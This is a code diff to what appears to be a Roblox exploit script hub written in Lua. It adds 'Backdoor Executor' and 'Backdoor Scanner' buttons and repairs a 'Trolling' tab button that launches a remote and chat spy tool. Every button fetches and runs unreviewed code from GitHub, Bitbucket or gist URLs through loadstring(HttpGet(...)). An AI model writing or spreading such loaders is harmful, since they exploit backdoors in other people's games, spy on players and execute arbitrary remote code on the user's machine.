@@ -352,6 +352,22 @@ ScriptsSection:Button({
     end 
 })
 
+ScriptsSection:Button({
+    Title = "Lalol Executor",
+    Desc = "Executes LALOL Hub Backdoor Scanner",
+    Callback = function() 
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script"))()
+    end 
+})
+
+ScriptsSection:Button({
+    Title = "Syntax Backdoor Executor",
+    Desc = "Executes Syntax v1.2.5",
+    Callback = function() 
+        loadstring(game:HttpGet('https://bitbucket.org/projects_early26/new/raw/0cd464afb03269ef1134a30fc8c407162e88dcac/v1.2.5.lua'))()
+    end 
+})
+
 
 local R15Section = AnimationsTab:Section({ 
     Title = "R15 Scripts",
@@ -659,7 +675,8 @@ TrollingTab:Button({
     Desc = "Launches remote/chat spy tool",
     Callback = function()
         task.spawn(function()
-            local success, err = pcall(functionloadstring(game:HttpGet("https://gist.githubusercontent.com/DEVADMINENGINE/9bb547b158bc241a29a14bd43139a7aa/raw/7d7aff0bc1ff69be2b7e8bca848dfbb843399c91/dev%2520spyer"))()
+            local success, err = pcall(function()
+                loadstring(game:HttpGet("https://gist.githubusercontent.com/DEVADMINENGINE/9bb547b158bc241a29a14bd43139a7aa/raw/7d7aff0bc1ff69be2b7e8bca848dfbb843399c91/dev%2520spyer"))()
             end)
             if not success then warn("Error loading Spy Script: " .. tostring(err)) end
         end)
